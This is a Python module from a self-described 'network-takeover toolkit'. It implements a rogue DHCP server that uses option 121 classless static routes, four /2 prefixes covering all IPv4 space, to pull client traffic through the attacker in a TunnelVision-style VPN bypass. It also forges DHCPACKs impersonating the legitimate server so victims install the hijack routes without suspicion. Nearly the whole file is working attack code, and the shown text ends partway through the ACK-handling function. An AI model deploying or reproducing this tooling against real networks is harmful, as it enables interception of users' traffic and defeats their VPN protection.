#!/usr/bin/env python3
# v3.0
"""
dhcp_takeover.py — DHCP engine for the network-takeover toolkit.

A library module (no orchestration of its own — see main.py).  Provides:

  Network setup (OSPF-derived, no trunking):
    pick_client_ip          Choose our IP from the OSPF-learned subnet.
    send_dhcpdiscover       Single untagged DHCPDISCOVER to find the real server.
    sniff_dhcpoffer         Capture the resulting DHCPOFFER (server IP + DNS).
    build_server_details_from_ospf  Assemble the server_details dict that the
                            rogue DHCP server consumes, populated with OSPF and
                            offer data.

  Rogue DHCP server (unchanged — still needed for option 121 injection):
    A full OFFER / ACK / NAK / RELEASE server with:
      * option 121 classless static routes (TunnelVision / VPN relay)
      * impersonation of the real server when a client picks it (forged ACKs)
      * DNS mirrored from the real server's offer
"""
import ipaddress
import platform
import random
import shutil
import socket
import subprocess
import time

from scapy.all import (
    BOOTP,
    DHCP,
    Dot1Q,
    Ether,
    IP,
    UDP,
    get_if_addr,
    get_if_hwaddr,
    mac2str,
    sendp,
    sniff,
)

DEFAULT_SUBNET_MASK = "255.255.255.0"
DEFAULT_PREFIX_LENGTH = 24
DEFAULT_DHCP_LEASE_TIME = 30 * 24 * 60 * 60
MAX_DHCP_LEASE_TIME = 0xFFFFFFFF
DEFAULT_INTERFACE = "eth0"
INTERFACE_IPV4_WAIT_INTERVAL = 2
INTERFACE_IPV4_WAIT_TIMEOUT = 60
DHCP_SNIFF_FILTER = "udp and (port 67 or 68) or (vlan and udp and (port 67 or 68))"
DHCP_DISCOVER_TYPES = {1, "discover"}
DHCP_OFFER_TYPES = {2, "offer"}
DHCP_REQUEST_TYPES = {3, "request"}
DHCP_NAK_TYPES = {6, "nak"}
DHCP_RELEASE_TYPES = {7, "release"}
LEASE_HOST_MIN = 2
LEASE_HOST_MAX = 253

# When True, if a client REQUESTs from the real server (option 54 != us), forge
# an ACK that impersonates that server but carries our option 121, so the client
# installs our routes while believing the legitimate server granted the lease.
IMPERSONATE_REAL_SERVER = True

# Four /2 routes cover the entire IPv4 space and are more specific than a VPN's
# typical /1 split-tunnel pair, so the kernel prefers them (TunnelVision attack).
# The gateway is filled in at runtime from server_details["source_ip"].
HIJACK_ROUTE_PREFIXES = [
    "0.0.0.0/2",
    "64.0.0.0/2",
    "128.0.0.0/2",
    "192.0.0.0/2",
]


def build_opt121(routes):
    """Encode classless static routes per RFC 3442.

    Each entry: [prefix_len][significant_net_octets][4-byte_gateway]
    A prefix of 0 (default route) contributes 0 network octets.
    When option 121 is present, RFC 3442-compliant clients MUST ignore option 3.
    """
    data = b""
    for net_cidr, gw in routes:
        net = ipaddress.IPv4Network(net_cidr, strict=False)
        prefix = net.prefixlen
        sig = (prefix + 7) // 8
        data += bytes([prefix]) + net.network_address.packed[:sig]
        data += ipaddress.IPv4Address(gw).packed
    return data


def print_step(status, message):
    print(f"[{status}] {message}", flush=True)


def run_command(description, command):
    print_step("START", description)
    try:
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as exc:
        print_step("FAIL", f"{description}: exit code {exc.returncode}")
        raise
    print_step("OK", description)


def run_capture_command(description, command):
    print_step("START", description)
    result = subprocess.run(
        command,
        capture_output=True,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        print_step("FAIL", f"{description}: exit code {result.returncode}")
        result.check_returncode()
    print_step("OK", description)
    return result.stdout



def iter_dhcp_options(packet):
    if not packet.haslayer(DHCP):
        return
    for option in packet[DHCP].options:
        if isinstance(option, tuple) and len(option) >= 2:
            yield option[0], option[1]


def get_dhcp_options(packet):
    options = {}
    for option_name, option_value in iter_dhcp_options(packet):
        options.setdefault(option_name, option_value)
    return options


def get_dhcp_message_type(packet):
    return next(
        (
            option_value
            for option_name, option_value in iter_dhcp_options(packet)
            if option_name == "message-type"
        ),
        None,
    )


def get_dhcp_option(packet, option_name):
    return next(
        (
            option_value
            for current_option_name, option_value in iter_dhcp_options(packet)
            if current_option_name == option_name
        ),
        None,
    )


def get_dhcp_lease_time():
    if 0 < MAX_DHCP_LEASE_TIME <= 0xFFFFFFFF:
        return MAX_DHCP_LEASE_TIME
    return DEFAULT_DHCP_LEASE_TIME


def get_requested_address(packet):
    requested_address = get_dhcp_option(packet, "requested_addr")
    if requested_address is None:
        requested_address = get_dhcp_option(packet, "requested_ip_address")
    if requested_address is None:
        return None
    try:
        return str(ipaddress.IPv4Address(requested_address))
    except ValueError:
        print_step("SKIP", f"Ignoring invalid requested address {requested_address}")
        return None


def get_requested_or_client_address(packet):
    requested_address = get_requested_address(packet)
    if requested_address is not None:
        return requested_address
    client_address = packet[BOOTP].ciaddr
    if not client_address or client_address == "0.0.0.0":
        return None
    try:
        return str(ipaddress.IPv4Address(client_address))
    except ValueError:
        print_step("SKIP", f"Ignoring invalid client address {client_address}")
        return None


def is_dhcp_discover(packet):
    return get_dhcp_message_type(packet) in DHCP_DISCOVER_TYPES


def is_dhcp_offer(packet):
    return get_dhcp_message_type(packet) in DHCP_OFFER_TYPES


def is_dhcp_request(packet):
    return get_dhcp_message_type(packet) in DHCP_REQUEST_TYPES


def get_offer_details(packet):
    """Extract useful details from a DHCPOFFER packet, including DNS."""
    bootp = packet[BOOTP]
    options = get_dhcp_options(packet)
    vlan_id = packet[Dot1Q].vlan if packet.haslayer(Dot1Q) else None
    server_id = options.get("server_id")
    src_ip = packet[IP].src if packet.haslayer(IP) else None

    return {
        "vlan": vlan_id,
        "offered_ip": bootp.yiaddr,
        "server_id": server_id,
        "router": options.get("router"),
        "subnet_mask": options.get("subnet_mask"),
        "lease_time": options.get("lease_time"),
        "dns": options.get("name_server"),
        "src_mac": packet[Ether].src if packet.haslayer(Ether) else None,
        "src_ip": src_ip,
        "dhcp_server_ip": server_id or src_ip,
        "xid": bootp.xid,
        "giaddr": bootp.giaddr,
    }


def get_first_ipv4_address(value):
    if value is None:
        return None
    values = value if isinstance(value, (list, tuple)) else [value]
    for item in values:
        try:
            return str(ipaddress.IPv4Address(item))
        except ValueError:
            continue
    return None



# ── OSPF-derived network setup ────────────────────────────────────────────────

def pick_client_ip(ospf_params, host_offset=2):
    """Pick an IP in the OSPF-learned subnet for our own interface.

    Starts at network_address + host_offset and skips the SVI gateway IP so we
    never collide with the router.  Raises ValueError if the subnet is too small.
    """
    network = ipaddress.IPv4Network(
        f"{ospf_params['src_ip']}/{ospf_params['netmask']}", strict=False
    )
    gateway = ipaddress.IPv4Address(ospf_params["src_ip"])
    candidate = network.network_address + host_offset
    while candidate <= network.broadcast_address:
        if candidate != gateway and candidate != network.network_address and candidate != network.broadcast_address:
            return str(candidate)
        candidate += 1
    raise ValueError(f"No usable host IP found in {network} (gateway={gateway})")


def send_dhcpdiscover(interface):
    """Broadcast a single untagged DHCPDISCOVER to find the real DHCP server.

    No 802.1Q tag — we are a normal access-port client.  The switch relays the
    broadcast to the DHCP server via ip helper-address.
    """
    src_mac = get_if_hwaddr(interface)
    src_mac_bytes = mac2str(src_mac)
    xid = random.getrandbits(32)
    pkt = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=src_mac)
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(op=1, htype=1, hlen=6, xid=xid, chaddr=src_mac_bytes)
        / DHCP(options=[("message-type", "discover"), "end"])
    )
    sendp(pkt, iface=interface, verbose=False)
    print_step("OK", f"Sent untagged DHCPDISCOVER on {interface} xid={xid:#010x}")
    return xid


def sniff_dhcpoffer(interface, timeout=10):
    """Wait for a DHCPOFFER and return its parsed details, or None on timeout.

    Used after send_dhcpdiscover to learn the real DHCP server's IP (option 54)
    and DNS server (option 6) for use in our rogue server's responses.
    """
    result = []

    def _handle(pkt):
        if not (pkt.haslayer(BOOTP) and pkt.haslayer(DHCP)):
            return
        if get_dhcp_message_type(pkt) not in DHCP_OFFER_TYPES:
            return
        result.append(get_offer_details(pkt))
        return True  # stop_filter

    print_step("START", f"Waiting {timeout}s for DHCPOFFER on {interface}")
    sniff(
        iface=interface,
        filter=DHCP_SNIFF_FILTER,
        store=False,
        timeout=timeout,
        stop_filter=lambda _: bool(result),
        prn=_handle,
    )
    if not result:
        print_step("WARN", "No DHCPOFFER received — server IP and DNS will be unknown")
        return None
    offer = result[0]
    print_step("OK", f"DHCPOFFER from server_id={offer['server_id']} dns={offer['dns']}")
    return offer


def build_server_details_from_ospf(interface, ospf_params, our_ip, offer=None, dns=None):
    """Build the server_details dict consumed by the rogue DHCP server.

    ospf_params   — learned from sniff_ospf_hellos (gives subnet + gateway).
    our_ip        — our chosen interface IP (from pick_client_ip).
    offer         — optional DHCPOFFER dict from sniff_dhcpoffer; if provided,
                    populates real_server_ip and dns from the legitimate server.
    dns           — manual DNS override (takes precedence over offer).

    The rogue server will advertise our_ip as its server_id.  When a client
    sends a REQUEST to the real server (option 54 != our_ip), the
    IMPERSONATE_REAL_SERVER path in ack_request() forges an ACK spoofing the
    real server's identity, learned directly from the client's REQUEST packet.
    """
    netmask = ospf_params["netmask"]
    gateway = ospf_params["src_ip"]  # SVI IP = default gateway for this subnet
    network = ipaddress.IPv4Network(f"{gateway}/{netmask}", strict=False)

    resolved_dns = dns or (get_first_ipv4_address(offer.get("dns")) if offer else None)

    print_step(
        "OK",
        f"DHCP server details: our_ip={our_ip} gateway={gateway} "
        f"network={network} dns={resolved_dns or 'unknown'}",
    )
    return {
        "interface": interface,
        "source_ip": our_ip,
        "gateway": gateway,
        "netmask": netmask,
        "dns": resolved_dns,
        "network": network,
        "vlan_details": {},
        "relay_only": False,
        "answered_request_xids": set(),
        "opt121_subnets": list(HIJACK_ROUTE_PREFIXES),
        "opt121_default_via_router": False,
    }




def set_static_address_windows(interface, address, netmask, gateway=None):
    print_step("START", f"Preparing Windows static address setup for {interface}")
    run_command(
        f"Releasing DHCP lease on Windows interface {interface}",
        ["ipconfig", "/release", interface],
    )
    command = [
        "netsh", "interface", "ipv4", "set", "address",
        f"name={interface}",
        "source=static",
        f"address={address}",
        f"mask={netmask}",
    ]
    run_command(
        f"Setting Windows static IP {address}/{netmask} on {interface}",
        command,
    )
    print_step("OK", f"Completed Windows static address setup for {interface}")


def get_kali_ipv4_addresses(interface):
    output = run_capture_command(
        f"Listing current IPv4 addresses on Linux interface {interface}",
        ["ip", "-4", "-o", "addr", "show", "dev", interface, "scope", "global"],
    )
    addresses = []
    for line in output.splitlines():
        parts = line.split()
        if "inet" in parts:
            inet_index = parts.index("inet")
            if inet_index + 1 < len(parts):
                addresses.append(parts[inet_index + 1])
    print_step("OK", f"Found {len(addresses)} existing IPv4 address(es) on {interface}")
    return addresses


def get_interface_ipv4_addresses(interface, scope="global"):
    if platform.system().lower() == "linux" and shutil.which("ip"):
        command = ["ip", "-4", "-o", "addr", "show", "dev", interface]
        if scope:
            command.extend(["scope", scope])
        result = subprocess.run(command, capture_output=True, text=True, check=False)
        if result.returncode == 0:
            addresses = []
            for line in result.stdout.splitlines():
                parts = line.split()
                if "inet" in parts:
                    inet_index = parts.index("inet")
                    if inet_index + 1 < len(parts):
                        addresses.append(parts[inet_index + 1])
            return addresses
    try:
        address = get_if_addr(interface)
    except Exception:
        return []
    if address and address != "0.0.0.0":
        return [address]
    return []


def wait_for_interface_ipv4_address(interface, expected_address=None, timeout=INTERFACE_IPV4_WAIT_TIMEOUT):
    expected_message = f" {expected_address}" if expected_address else ""
    print_step("START", f"Waiting for {interface} to have IPv4 address{expected_message}")
    deadline = time.monotonic() + timeout if timeout is not None else None

    while True:
        addresses = get_interface_ipv4_addresses(interface)
        plain_addresses = [address.split("/", 1)[0] for address in addresses]
        if expected_address:
            if expected_address in plain_addresses:
                print_step("OK", f"{interface} has expected IPv4 address {expected_address}")
                return addresses
        elif addresses:
            print_step("OK", f"{interface} has IPv4 address(es): {addresses}")
            return addresses
        if deadline is not None and time.monotonic() >= deadline:
            print_step("FAIL", f"Timed out after {timeout} seconds waiting for IPv4 address on {interface}")
            raise TimeoutError(f"Timed out waiting for IPv4 address on {interface}")
        time.sleep(INTERFACE_IPV4_WAIT_INTERVAL)


def linux_interface_exists(interface):
    if platform.system().lower() != "linux" or not shutil.which("ip"):
        return False
    result = subprocess.run(
        ["ip", "link", "show", "dev", interface],
        capture_output=True,
        text=True,
        check=False,
    )
    return result.returncode == 0


def build_vlan_subinterface_name(parent_interface, vlan_id):
    return f"{parent_interface}.{int(vlan_id)}"


def ensure_vlan_subinterface(parent_interface, vlan_id):
    if vlan_id is None:
        return parent_interface
    vlan_id = int(vlan_id)
    if not 1 <= vlan_id <= 4094:
        raise ValueError(f"Invalid VLAN ID for subinterface creation: {vlan_id}")
    system = platform.system().lower()
    if system != "linux":
        raise OSError("VLAN subinterface creation is only supported on Linux/Kali")
    if not shutil.which("ip"):
        raise FileNotFoundError("The Linux 'ip' command is required to create VLAN subinterfaces")
    if parent_interface.endswith(f".{vlan_id}"):
        subinterface = parent_interface
    else:
        subinterface = build_vlan_subinterface_name(parent_interface, vlan_id)
    if linux_interface_exists(subinterface):
        print_step("OK", f"VLAN subinterface {subinterface} already exists")
    else:
        run_command(
            f"Creating VLAN {vlan_id} subinterface {subinterface} on {parent_interface}",
            ["ip", "link", "add", "link", parent_interface, "name", subinterface, "type", "vlan", "id", str(vlan_id)],
        )
    run_command(f"Bringing parent interface {parent_interface} up", ["ip", "link", "set", parent_interface, "up"])
    run_command(f"Bringing VLAN subinterface {subinterface} up", ["ip", "link", "set", subinterface, "up"])
    return subinterface



def remove_kali_ipv4_addresses(interface):
    print_step("START", f"Removing existing IPv4 addresses from Linux interface {interface}")
    addresses = get_kali_ipv4_addresses(interface)
    if not addresses:
        print_step("OK", f"No existing IPv4 addresses found on Linux interface {interface}")
        return
    for current_address in addresses:
        run_command(
            f"Removing existing Linux IPv4 address {current_address} from {interface}",
            ["ip", "addr", "del", current_address, "dev", interface],
        )
    print_step("OK", f"Removed {len(addresses)} existing IPv4 address(es) from {interface}")


def set_static_address_kali(interface, address, netmask, gateway=None):
    print_step("START", f"Preparing Kali static address setup for {interface}")
    if shutil.which("dhclient"):
        run_command(
            f"Releasing DHCP lease on Linux interface {interface}",
            ["dhclient", "-r", interface],
        )
    else:
        print_step("SKIP", "dhclient was not found; skipping DHCP lease release")
    prefix_length = ipaddress.IPv4Network(f"0.0.0.0/{netmask}").prefixlen
    remove_kali_ipv4_addresses(interface)
    run_command(
        f"Flushing addresses on Linux interface {interface}",
        ["ip", "-4", "addr", "flush", "dev", interface, "scope", "global"],
    )
    remove_kali_ipv4_addresses(interface)
    run_command(
        f"Adding Linux static IP {address}/{prefix_length} on {interface}",
        ["ip", "addr", "add", f"{address}/{prefix_length}", "dev", interface],
    )
    run_command(f"Bringing Linux interface {interface} up", ["ip", "link", "set", interface, "up"])
    print_step("SKIP", "Skipping default gateway setup")
    print_step("OK", f"Completed Kali static address setup for {interface}")


def set_static_address(interface, address, netmask, gateway=None):
    system = platform.system().lower()
    print_step("START", f"Detected operating system: {system}")
    if system == "windows":
        set_static_address_windows(interface, address, netmask, gateway)
    elif system == "linux":
        set_static_address_kali(interface, address, netmask, gateway)
    else:
        print_step("FAIL", f"Unsupported operating system: {platform.system()}")
        raise OSError(f"Unsupported operating system for static address setup: {platform.system()}")
    print_step("OK", f"Static address setup finished on {interface}")



def get_server_mac(server_details):
    server_mac = server_details.get("server_mac")
    if server_mac is None:
        server_mac = get_if_hwaddr(server_details["interface"])
        server_details["server_mac"] = server_mac
    return server_mac


def get_client_key(packet):
    bootp = packet[BOOTP]
    hlen = bootp.hlen or 6
    chaddr = bootp.chaddr
    if isinstance(chaddr, bytes):
        client_id = chaddr[:hlen].hex(":")
    else:
        client_id = str(chaddr)
    return (bootp.xid, client_id)


def get_proposed_lease_key(packet, dhcp_network):
    bootp = packet[BOOTP]
    xid, client_id = get_client_key(packet)
    if bootp.giaddr == "0.0.0.0":
        return (xid, client_id, "direct", str(dhcp_network["network"]))
    return (xid, client_id, "relay", str(dhcp_network["network"]))


def get_bootp_client_mac(packet):
    if not packet.haslayer(BOOTP):
        return None
    bootp = packet[BOOTP]
    hlen = bootp.hlen or 6
    chaddr = bootp.chaddr
    if not isinstance(chaddr, bytes):
        return None
    client_mac = chaddr[:hlen]
    if len(client_mac) != 6:
        return None
    return client_mac.hex(":")


def get_packet_vlan_id(packet):
    if packet.haslayer(Dot1Q):
        return packet[Dot1Q].vlan
    return None


def get_effective_relay_agent_ip(packet, server_details):
    giaddr = packet[BOOTP].giaddr
    if giaddr != "0.0.0.0":
        return giaddr
    return giaddr


def get_learned_vlan_details(packet, server_details):
    vlan_id = get_packet_vlan_id(packet)
    if vlan_id is None:
        return None
    return server_details.get("vlan_details", {}).get(vlan_id)


def get_direct_client_network(packet, requested_address, server_details):
    vlan_details = get_learned_vlan_details(packet, server_details)
    if vlan_details:
        return vlan_details["network"]
    if requested_address:
        return ipaddress.IPv4Network(f"{requested_address}/{DEFAULT_PREFIX_LENGTH}", strict=False)
    vlan_id = get_packet_vlan_id(packet)
    if vlan_id is not None:
        if 1 <= vlan_id <= 254:
            return ipaddress.IPv4Network(f"192.168.{vlan_id}.0/{DEFAULT_PREFIX_LENGTH}")
    return server_details["network"]


def get_direct_client_subnet_mask(packet, network, server_details):
    vlan_details = get_learned_vlan_details(packet, server_details)
    if vlan_details:
        return vlan_details["subnet_mask"]
    return str(network.netmask)


def get_direct_client_router(packet, network, server_details):
    vlan_details = get_learned_vlan_details(packet, server_details)
    if vlan_details and vlan_details.get("router"):
        return vlan_details["router"]
    return get_default_router_for_network(network, server_details.get("gateway"))


def get_default_router_for_network(network, fallback_gateway=None):
    if fallback_gateway:
        return fallback_gateway
    if network.prefixlen == DEFAULT_PREFIX_LENGTH:
        return str(network.network_address + 1)
    return None


def get_relayed_client_network(giaddr, requested_address):
    relay_network = ipaddress.IPv4Network(f"{giaddr}/{DEFAULT_PREFIX_LENGTH}", strict=False)
    if requested_address:
        requested_network = ipaddress.IPv4Network(
            f"{requested_address}/{DEFAULT_PREFIX_LENGTH}",
            strict=False,
        )
        if requested_network != relay_network:
            print_step(
                "WARN",
                (
                    f"Relay giaddr {giaddr} points to {relay_network}, "
                    f"but requested address {requested_address} points to {requested_network}; "
                    "using requested-address network for the lease pool"
                ),
            )
            return requested_network
    return relay_network


def get_or_add_dhcp_network(packet, networks, server_details):
    giaddr = packet[BOOTP].giaddr
    relay_agent_ip = get_effective_relay_agent_ip(packet, server_details)
    requested_address = get_requested_or_client_address(packet)
    vlan_id = get_packet_vlan_id(packet)

    if giaddr == "0.0.0.0":
        network = get_direct_client_network(packet, requested_address, server_details)
        subnet_mask = get_direct_client_subnet_mask(packet, network, server_details)
        network_key = ("direct", str(network))
        router = get_direct_client_router(packet, network, server_details)
        excluded_addresses = {server_details["source_ip"]}
        if router:
            excluded_addresses.add(router)
        mode = "direct"
    else:
        network = get_relayed_client_network(giaddr, requested_address)
        subnet_mask = DEFAULT_SUBNET_MASK
        network_key = ("relay", str(network))
        router = get_default_router_for_network(network, giaddr)
        excluded_addresses = {giaddr}
        if router:
            excluded_addresses.add(router)
        mode = "relay"

    for dhcp_network in networks:
        if dhcp_network["key"] == network_key:
            if mode == "relay":
                dhcp_network["giaddr"] = giaddr
                dhcp_network["relay_agent_ip"] = relay_agent_ip
                dhcp_network["excluded_addresses"].add(giaddr)
                if router:
                    dhcp_network["excluded_addresses"].add(router)
            if vlan_id is not None and dhcp_network.get("vlan_id") != vlan_id:
                print_step("OK", f"Updating DHCP {mode} network {network} vlan={vlan_id}")
                dhcp_network["vlan_id"] = vlan_id
            return dhcp_network

    dhcp_network = {
        "key": network_key,
        "giaddr": giaddr,
        "relay_agent_ip": relay_agent_ip,
        "mode": mode,
        "vlan_id": vlan_id,
        "network": network,
        "subnet_mask": subnet_mask,
        "router": router,
        "excluded_addresses": excluded_addresses,
        "leased_addresses": set(),
        "proposed_addresses": set(),
    }
    networks.append(dhcp_network)
    print_step("OK", f"Tracking DHCP {mode} network {network} vlan={vlan_id}")
    return dhcp_network


def is_lease_address_available(dhcp_network, address):
    network = dhcp_network["network"]
    try:
        ip_address = ipaddress.IPv4Address(address)
    except ValueError:
        return False
    if ip_address not in network:
        return False
    host_number = int(ip_address) - int(network.network_address)
    if not LEASE_HOST_MIN <= host_number <= LEASE_HOST_MAX:
        return False
    address = str(ip_address)
    if address in dhcp_network["excluded_addresses"]:
        return False
    if address in dhcp_network["leased_addresses"]:
        return False
    if address in dhcp_network["proposed_addresses"]:
        return False
    return True


def is_requested_lease_address_usable(dhcp_network, address):
    network = dhcp_network["network"]
    try:
        ip_address = ipaddress.IPv4Address(address)
    except ValueError:
        return False
    if ip_address not in network:
        return False
    host_number = int(ip_address) - int(network.network_address)
    if not LEASE_HOST_MIN <= host_number <= LEASE_HOST_MAX:
        return False
    return str(ip_address) not in dhcp_network["excluded_addresses"]


def reserve_lease_address(dhcp_network, address):
    dhcp_network["proposed_addresses"].add(address)
    print_step("OK", f"Reserved proposed lease {address} on {dhcp_network['network']}")
    return address


def lease_next_available_address(dhcp_network, requested_address=None):
    network = dhcp_network["network"]
    if requested_address and is_lease_address_available(dhcp_network, requested_address):
        return reserve_lease_address(dhcp_network, requested_address)
    if requested_address:
        print_step("SKIP", f"Requested lease {requested_address} is unavailable on {network}")
    for host_number in range(LEASE_HOST_MIN, LEASE_HOST_MAX + 1):
        candidate = str(network.network_address + host_number)
        if is_lease_address_available(dhcp_network, candidate):
            return reserve_lease_address(dhcp_network, candidate)
    print_step("FAIL", f"No free lease available on {network}")
    return None


def get_dns_for_response(dhcp_network, server_details):
    """Resolve DNS to use in a response: per-VLAN learned > server-level learned > None."""
    vlan_id = dhcp_network.get("vlan_id")
    if vlan_id is not None:
        vlan_dns = server_details.get("vlan_details", {}).get(vlan_id, {}).get("dns")
        if vlan_dns:
            return vlan_dns
    return server_details.get("dns")


def build_dhcp_response(packet, message_type, offered_ip, dhcp_network, server_ip, server_mac=None, server_details=None):
    """Build a DHCPOFFER or DHCPACK with DNS (from legit server) and option 121 route injection."""
    bootp = packet[BOOTP]
    giaddr = dhcp_network["giaddr"]
    subnet_mask = dhcp_network["subnet_mask"]
    router = dhcp_network["router"]
    vlan_id = dhcp_network.get("vlan_id")
    lease_time = get_dhcp_lease_time()
    is_relayed = dhcp_network["mode"] == "relay"
    client_mac = get_bootp_client_mac(packet)
    broadcast_requested = bool(int(bootp.flags) & 0x8000)
    dst_ip = giaddr if is_relayed or broadcast_requested else offered_ip
    dst_port = 67 if is_relayed else 68

    dhcp_options = [
        ("message-type", message_type),
        ("server_id", server_ip),
        ("subnet_mask", subnet_mask),
    ]

    # DNS: mirror the legitimate server's DNS so clients get working resolution.
    if server_details is not None:
        dns = get_dns_for_response(dhcp_network, server_details)
        if dns:
            dhcp_options.append(("name_server", dns))

    if router:
        dhcp_options.append(("router", router))

    # Option 121: classless static routes that override the default gateway on
    # RFC 3442-compliant clients (more-specific routes win, beating a VPN's /1
    # split-tunnel pair).  The route set is driven entirely by server_details so
    # the same builder serves both the full hijack and the selective VPN relay:
    #   opt121_subnets            -> each CIDR routed via our identity (source_ip)
    #   opt121_default_via_router -> also push 0.0.0.0/0 via this VLAN's router
    #                                (passthrough for non-relayed traffic)
    # The VPN/hijack next-hop is always source_ip (our loopback identity), even
    # when server_ip is spoofed during impersonation, so victim packets still
    # land on our physical interface.
    opt121_routes = []
    if server_details is not None:
        our_ip = server_details.get("source_ip", server_ip)
        for subnet in server_details.get("opt121_subnets", []):
            opt121_routes.append((subnet, our_ip))
        if server_details.get("opt121_default_via_router") and router:
            opt121_routes.append(("0.0.0.0/0", router))
    if opt121_routes:
        dhcp_options.append((121, build_opt121(opt121_routes)))

    dhcp_options.extend(
        [
            ("lease_time", lease_time),
            ("renewal_time", lease_time // 2),
            ("rebinding_time", int(lease_time * 0.875)),
            "end",
        ]
    )

    response = (
        IP(src=server_ip, dst=dst_ip)
        / UDP(sport=67, dport=dst_port)
        / BOOTP(
            op=2,
            xid=bootp.xid,
            yiaddr=offered_ip,
            siaddr=server_ip,
            giaddr=giaddr,
            chaddr=bootp.chaddr,
            flags=bootp.flags,
        )
        / DHCP(options=dhcp_options)
    )

    if packet.haslayer(Ether):
        ether_layer = packet[Ether]
        if is_relayed:
            dst_mac = ether_layer.src
        else:
            dst_mac = client_mac or ether_layer.src or "ff:ff:ff:ff:ff:ff"
        ether = Ether(src=server_mac, dst=dst_mac)
        if vlan_id is not None:
            response = ether / Dot1Q(vlan=vlan_id) / response
        else:
            response = ether / response

    return response


def build_dhcp_nak(packet, server_ip, server_mac, vlan_id=None):
    """Build a DHCPNAK broadcast response.  NAK is always sent to the broadcast address per RFC 2131."""
    bootp = packet[BOOTP]
    dhcp_options = [
        ("message-type", "nak"),
        ("server_id", server_ip),
        "end",
    ]
    response = (
        IP(src=server_ip, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(op=2, xid=bootp.xid, chaddr=bootp.chaddr)
        / DHCP(options=dhcp_options)
    )
    if packet.haslayer(Ether):
        ether = Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff")
        if vlan_id is not None:
            response = ether / Dot1Q(vlan=vlan_id) / response
        else:
            response = ether / response
    return response


def log_built_dhcp_response(label, packet):
    dst_mac = packet[Ether].dst if packet.haslayer(Ether) else None
    dst_ip = packet[IP].dst if packet.haslayer(IP) else None
    print_step(
        "OK",
        f"Built {label} dst_mac={dst_mac} dst_ip={dst_ip} vlan={get_packet_vlan_id(packet)}",
    )


def offer_address_to_discover(packet, networks, proposed_leases, server_details):
    """Respond to a DHCPDISCOVER with a DHCPOFFER and return the offered IP."""
    if not packet.haslayer(BOOTP) or not is_dhcp_discover(packet):
        print_step("SKIP", "Packet is not a DHCPDISCOVER")
        return None

    giaddr = packet[BOOTP].giaddr
    print_step("START", f"Processing DHCPDISCOVER xid={packet[BOOTP].xid} giaddr={giaddr}")
    dhcp_network = get_or_add_dhcp_network(packet, networks, server_details)

    lease_key = get_proposed_lease_key(packet, dhcp_network)
    existing_offer = proposed_leases.get(lease_key)
    requested_address = get_requested_address(packet)
    offered_ip = (
        existing_offer["ip_address"]
        if existing_offer
        else lease_next_available_address(dhcp_network, requested_address)
    )
    if offered_ip is None:
        return None

    server_ip = server_details["source_ip"]
    proposed_leases[lease_key] = {
        "ip_address": offered_ip,
        "key": lease_key,
    }

    offer_packet = build_dhcp_response(
        packet,
        "offer",
        offered_ip,
        dhcp_network,
        server_ip,
        get_server_mac(server_details),
        server_details=server_details,
    )
    log_built_dhcp_response("DHCPOFFER", offer_packet)
    if dhcp_network["mode"] == "relay":
        print_step("START", f"Sending DHCPOFFER {offered_ip} to relay {giaddr}")
    else:
        print_step(
            "START",
            f"Sending DHCPOFFER {offered_ip} directly to client "
            f"on {dhcp_network['network']} with router {dhcp_network['router']}",
        )
    sendp(offer_packet, iface=server_details["interface"], verbose=False)
    print_step("OK", f"Sent DHCPOFFER {offered_ip}")
    return offered_ip


def ack_request(packet, networks, proposed_leases, server_details):
    """Respond to a DHCPREQUEST with a DHCPACK (or impersonated ACK), sending NAK when invalid."""
    if not packet.haslayer(BOOTP) or not is_dhcp_request(packet):
        print_step("SKIP", "Packet is not a DHCPREQUEST")
        return None

    bootp = packet[BOOTP]
    answered_xids = server_details.setdefault("answered_request_xids", set())
    if bootp.xid in answered_xids:
        print_step("SKIP", f"Ignoring DHCPREQUEST xid={bootp.xid} because it was already answered")
        return None

    print_step("START", f"Processing DHCPREQUEST xid={bootp.xid} giaddr={bootp.giaddr}")
    dhcp_network = get_or_add_dhcp_network(packet, networks, server_details)
    server_ip = server_details["source_ip"]
    server_mac = get_server_mac(server_details)
    vlan_id = dhcp_network.get("vlan_id")

    # Impersonation path: client chose a different (real) server via option 54.
    # Forge an ACK that spoofs that server's IP and option 54 so the client
    # accepts the lease it asked for, while our option 121 installs our routes.
    req_server_id = get_dhcp_option(packet, "server_id")
    if req_server_id and req_server_id != server_ip:
        proposed_leases.pop(get_proposed_lease_key(packet, dhcp_network), None)
        if IMPERSONATE_REAL_SERVER:
            requested_ip = get_requested_or_client_address(packet)
            if requested_ip and requested_ip != "0.0.0.0":
                print_step(
                    "START",
                    f"IMPERSONATE xid={bootp.xid} client chose {req_server_id}; "
                    f"forging ACK for {requested_ip} spoofing {req_server_id}",
                )
                # Pass req_server_id as server_ip so BOOTP siaddr, IP src, and
                # option 54 all carry the real server's identity.
                spoof_ack = build_dhcp_response(
                    packet,
                    "ack",
                    requested_ip,
                    dhcp_network,
                    req_server_id,
                    server_mac,
                    server_details=server_details,
                )
                log_built_dhcp_response("DHCPACK(spoofed)", spoof_ack)
                sendp(spoof_ack, iface=server_details["interface"], verbose=False)
                print_step("OK", f"Sent spoofed DHCPACK {requested_ip} as {req_server_id}")
                answered_xids.add(bootp.xid)
                return requested_ip
            else:
                print_step("SKIP", f"IMPERSONATE skipped: no usable requested IP in xid={bootp.xid}")
        else:
            print_step("SKIP", f"Client chose {req_server_id}; impersonation disabled, staying silent")
        return None

    lease_key = get_proposed_lease_key(packet, dhcp_network)
    proposed_lease = proposed_leases.get(lease_key)
    requested_ip = get_requested_or_client_address(packet)

    if proposed_lease is None:
        offered_ip = requested_ip
        if offered_ip is None:
            print_step("FAIL", "Ignoring DHCPREQUEST with no requested or client address")
            return None
        if not is_requested_lease_address_usable(dhcp_network, offered_ip):
            print_step("FAIL", f"Sending DHCPNAK: requested lease {offered_ip} is unavailable")
            nak_packet = build_dhcp_nak(packet, server_ip, server_mac, vlan_id)
            log_built_dhcp_response("DHCPNAK", nak_packet)
            sendp(nak_packet, iface=server_details["interface"], verbose=False)
            return None
        print_step("OK", f"Accepting first DHCPREQUEST xid={bootp.xid} for {offered_ip} without prior offer")
    else:
        offered_ip = proposed_lease["ip_address"]

